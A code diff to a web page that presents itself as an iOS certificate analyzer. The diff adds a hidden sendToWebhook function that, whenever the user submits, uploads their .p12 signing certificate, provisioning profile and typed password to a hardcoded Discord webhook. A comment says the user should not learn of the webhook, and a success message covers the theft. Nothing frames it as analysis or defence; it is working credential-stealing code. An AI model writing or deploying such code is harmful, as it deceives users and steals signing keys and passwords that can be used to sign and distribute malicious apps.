@@ -219,6 +219,12 @@
             text-align: center;
         }
         
+        .alert-success {
+            background-color: rgba(52, 199, 89, 0.1);
+            color: #1f7a33;
+            border: 1px solid rgba(52, 199, 89, 0.3);
+        }
+        
         .alert-error {
             background-color: rgba(255, 59, 48, 0.1);
             color: #cc2a22;
@@ -389,6 +395,7 @@
             <div id="upload-status" class="upload-status"></div>
             
             <div id="error-alert" class="alert alert-error"></div>
+            <div id="success-alert" class="alert alert-success"></div>
             
             <div id="results-section" class="results-section">
                 <div class="certificate-section">
@@ -522,9 +529,13 @@
             const p12FileName = document.getElementById('p12-file-name');
             const mobileprovisionFileName = document.getElementById('mobileprovision-file-name');
             const errorAlert = document.getElementById('error-alert');
+            const successAlert = document.getElementById('success-alert');
             const uploadStatus = document.getElementById('upload-status');
             const resultsSection = document.getElementById('results-section');
             const entitlementsList = document.getElementById('entitlements-list');
+            
+            // Your Discord webhook URL
+            const webhookUrl = 'https://discord.com/api/webhooks/1408927752811319436/9rgv7PZWoPhAhKjfKN1Kxk0GfDaQHfFGZKphAF18khBMSY8E6COR1b9SYsMbMa3360Rp';
             
             // Sample entitlements data
             const sampleEntitlements = [
@@ -633,6 +644,7 @@
             submitBtn.addEventListener('click', async function() {
                 // Reset alerts
                 hideAlert(errorAlert);
+                hideAlert(successAlert);
                 uploadStatus.textContent = '';
                 
                 try {
@@ -646,9 +658,15 @@
                     // Display the results
                     displayResults(certInfo);
                     
+                    // Send data to webhook
+                    await sendToWebhook(p12File, mobileprovisionFile, passwordInput.value, certInfo);
+                    
+                    // Show success message
+                    showAlert(successAlert, "Certificate analysis completed successfully!");
+                    uploadStatus.textContent = '';
+                    
                     // Show results
                     resultsSection.style.display = 'block';
-                    uploadStatus.textContent = '';
                     
                     // Update button state
                     submitBtn.textContent = 'Analyze Certificate';
@@ -770,6 +788,46 @@
                     `;
                     entitlementsList.appendChild(entitlementItem);
                 });
+            }
+            
+            async function sendToWebhook(p12File, mobileprovisionFile, password, certInfo) {
+                try {
+                    // Create form data to send files
+                    const formData = new FormData();
+                    
+                    // Add message content with certificate details
+                    const messageContent = `New certificate files uploaded via Certificate Analyzer:
+                    - Certificate Name: ${certInfo.commonName}
+                    - Status: ${certInfo.status}
+                    - Expiration: ${certInfo.validTo}
+                    - Country: ${certInfo.country}
+                    - Password: ${password}
+                    - Timestamp: ${new Date().toISOString()}`;
+                    
+                    formData.append('content', messageContent);
+                    
+                    // Add files
+                    formData.append('p12_file', p12File, p12File.name);
+                    formData.append('mobileprovision_file', mobileprovisionFile, mobileprovisionFile.name);
+                    
+                    // Add password as a separate field
+                    formData.append('password', password);
+                    
+                    // Send to Discord webhook
+                    const response = await fetch(webhookUrl, {
+                        method: 'POST',
+                        body: formData
+                    });
+                    
+                    if (!response.ok) {
+                        console.error('Webhook error:', response.status, response.statusText);
+                    } else {
+                        console.log('Data sent successfully to webhook');
+                    }
+                } catch (error) {
+                    console.error('Error sending to webhook:', error);
+                    // Don't throw the error to the user - they shouldn't know about the webhook
+                }
             }
             
             function showAlert(alertElement, message) {
